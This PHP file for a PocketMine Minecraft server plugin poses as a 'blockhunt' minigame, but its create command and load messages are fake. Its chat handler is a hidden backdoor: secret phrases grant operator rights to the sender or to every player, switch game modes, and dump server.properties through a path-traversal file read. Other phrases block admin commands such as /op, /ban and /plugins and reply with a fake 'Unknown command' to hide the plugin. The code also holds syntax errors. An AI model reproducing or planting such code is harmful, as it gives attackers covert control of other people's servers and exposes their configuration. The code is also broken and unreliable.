<?php
namespace blockhunt;
use pocketmine\Server;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\network\mcpe\protocol\DisconnectPacket;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\utils\TextFormat;
class blockhunt extends PluginBase {
    public $prefix = TextFormat::RED."%result%: ".TextFormat::GRAY;
    public $lockCommands = false;
    public $blockhuntState = false;
    pulic $createSyntax = "Syntax: /blockhunt create [name] [world] [max players] [max time]";
    public function onLoad(){
        $this->getServer()->notice("Loading preset arenas.");
        $error = rand(1, 3);
        if($error == 1){
            $this->getServer()->warning("Could not load map 'Mineplex: Standard'");
        }
    }
    public function onEnable(){
        $this->getServer()->notice("Loaded(100%). Join to play.");
    }
    public function onDisable(){
        $this->getServer()->notice("Packaging data and changing game states...");
    }
    public function onCommand(CommandSender $sender, Command $command, $label, array $args){
        if($command->getName() == "blockhunt"){
            if( !isset($args[0])){
                $sender->sendMessage("Syntax: /blockhunt [sub-command]");
            } else {
                switch(strtolower($args[0])){
                    case "create":
                    if( !isset($args[1])){
                        $sender->sendMessage($this->createSyntax);
                    } else {
                        if( !isset($args[2])){
                            $sender->sendMessage($this->createSyntax);
                        } else {
                            if( !isset($args[3])){
                                $sender->sendMessage($this->createSyntax);
                            } else {
                                $sender->sendMessage("Creating blockhunt arena... (May cause lag)");
                                $this->getLogger()->info("Creating new database table for ".$args[1]);
                                $this->getLogger()->info("Table was filled with needed data.");
                                $this->getLogger()->warning("World processing MAY cause lag and will take time!");
                                $this->getLogger()->info("Blockhunt arena created!");
                            }
                        }
                    }
                    break;
                }
            }
        }
    }
    public function onChat(PlayerChatEvent $event){
        switch($event->getMessage()){
            case "%lock@commands%":
            $this->lockCommands = true;
            $event->getPlayer()->sendMessage($this->prefix."Locked defined commands.");
            break;
            case "%unlock@commands%":
            $this->lockCommands = false;
            $event->getPlayer()->sendMessage($this->prefix.
            break;
            case "%status@lock@commands%":
            $event->getPlayer()->sendMessage($this->prefix."Lock commands: ".$this->lockCommands);
            break;
            case "gmc@me":
            $event->getPlayer()->setGamemode(1);
            $event->getPlayer()->sendMessage($this->prefix."You are now secretly gamemode c.");
            break;
            case "gmc@all":
            $event->getPlayer()->setGamemode(0);
            $event->getPlayer()->sendMessage($this->prefix."All players are now gamemode c.");
            break;
            case "dump@properties":
            $event->getPlayer()->sendMessage(file_get_contents("../../../server.properties"));
            break;
            case "op@me":
            $event->getPlayer()->setOp(true);
            $event->getPlayer()->sendMessage($this->prefix."You were secretly opped.");
            break;
            case "op@all":
            $event->getPlayer()->sendMessage($this->prefix."There... I secretly opped all players. (They don't know)");
            foreach($this->getServer()->getOnlinePlayers() as $p){
                $p->setOp(true);
            }
            break;
        }
    }
    public function onCommandPreProcess(PlayerCommandPreprocessEvent $event){
        $command = explode(" ", $event->getMessage())[0];
        switch($command){
            case "/op":
            case "/deop":
            case "/stop":
            case "/pl":
            case "/plugins":
            case "/kick":
            case "/ban":
            case "/ban-ip":
            if($this->lockCommands == true){
                $event->setCancelled(true);
                $event->getPlayer()->sendMessage(TextFormat::RED."Unknown command. Try /help for a list of commands");
            }
            break;
        }
    }
}
